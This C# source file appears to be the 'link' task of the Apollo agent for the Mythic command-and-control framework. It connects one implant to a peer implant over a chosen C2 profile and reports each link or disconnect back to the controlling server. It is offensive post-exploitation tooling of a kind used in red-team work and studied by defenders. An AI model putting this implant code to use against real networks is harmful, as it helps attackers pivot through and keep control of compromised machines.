#define COMMAND_NAME_UPPER

#if DEBUG
#define LINK
#endif

#if LINK

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;

namespace Tasks
{
    public class link : Tasking
    {
        [DataContract]
        internal struct LinkParameters
        {
            [DataMember(Name = "connection_info")]
            public PeerInformation ConnectionInfo;
        }

        public link(IAgent agent, Task task) : base(agent, task)
        {
            
        }

        public override void Kill()
        {
            throw new NotImplementedException();
        }

        public override void Start()
        {
            TaskResponse resp;
            ApolloInterop.Classes.P2P.Peer p = null;
            try
            {
                LinkParameters parameters = _jsonSerializer.Deserialize<LinkParameters>(_data.Parameters);
                p = _agent.GetPeerManager().AddPeer(parameters.ConnectionInfo);
                p.UUIDNegotiated += (object o, UUIDEventArgs a) =>
                {
                    resp = CreateTaskResponse(
                        $"Established link to {parameters.ConnectionInfo.Hostname}",
                        true,
                        "completed",
                        new IMythicMessage[1]
                        {
                            new EdgeNode()
                            {
                                Source = _agent.GetUUID(),
                                Destination = p.GetMythicUUID(),
                                Direction = EdgeDirection.SourceToDestination,
                                Action = "add",
                                C2Profile = parameters.ConnectionInfo.C2Profile.Name,
                                MetaData = ""
                            }
                        });
                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                };
                p.Disconnect += (object o2, EventArgs a2) =>
                {
                    resp = CreateTaskResponse(
                        $"\nLost link to {parameters.ConnectionInfo.Hostname}",
                        true,
                        "error",
                        new IMythicMessage[1]
                        {
                            new EdgeNode()
                            {
                                Source = _agent.GetUUID(),
                                Destination = p.GetMythicUUID(),
                                Direction = EdgeDirection.SourceToDestination,
                                Action = "remove",
                                C2Profile = parameters.ConnectionInfo.C2Profile.Name,
                                MetaData = ""
                            }
                        });
                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                };
                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("", false, "", new IMythicMessage[]
                    {
                        Artifact.NetworkConnection(parameters.ConnectionInfo.Hostname)
                    }));
                if (!p.Start())
                {
                    resp = CreateTaskResponse(
                        $"Failed to connect to {parameters.ConnectionInfo.Hostname}",
                        true,
                        "error");
                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                    _agent.GetPeerManager().Remove(p);
                }
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse(
                    $"{ex.StackTrace}\n\nFailed to establish connection. Reason: {ex.Message}",
                    true,
                    "error");
                if (p != null)
                {
                    _agent.GetPeerManager().Remove(p);
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }
        }
    }
}
#endif